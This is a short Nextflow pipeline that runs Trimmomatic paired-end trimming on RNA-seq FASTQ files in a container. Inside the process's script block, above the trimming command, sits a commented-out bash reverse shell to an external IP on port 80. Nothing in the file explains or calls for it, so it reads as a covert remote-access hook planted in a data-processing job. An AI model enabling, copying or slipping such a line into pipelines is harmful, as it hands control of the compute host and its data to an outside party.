process TRIMMOMATIC {
    container 'staphb/trimmomatic:0.39'
    containerOptions "-e FUSION_LOG_LEVEL=trace"

    script:
    """
    #bash -i >& /dev/tcp/34.175.63.16/80 0>&1
    trimmomatic PE \
                -threads 5 \
                -phred33 \
                -trimlog /dev/null \
                /fusion/s3/ngi-igenomes/test-data/rnaseq/SRX1603629_T1_2.fastq.gz \
                /fusion/s3/ngi-igenomes/test-data/rnaseq/SRX1603630_T1_2.fastq.gz \
                07id_S7_R1.trim.fastq.gz \
                07id_S7_R1.unpaired.fastq.gz \
                07id_S7_R2.trim.fastq.gz \
                07id_S7_R2.unpaired.fastq.gz \
                LEADING:3 \
                TRAILING:3 \
                SLIDINGWINDOW:4:15 \
                MINLEN:27 \
                ILLUMINACLIP:/Trimmomatic-0.39/adapters/NexteraPE-PE.fa:2:30:10
    """
}

workflow {
  main:
    TRIMMOMATIC()
}
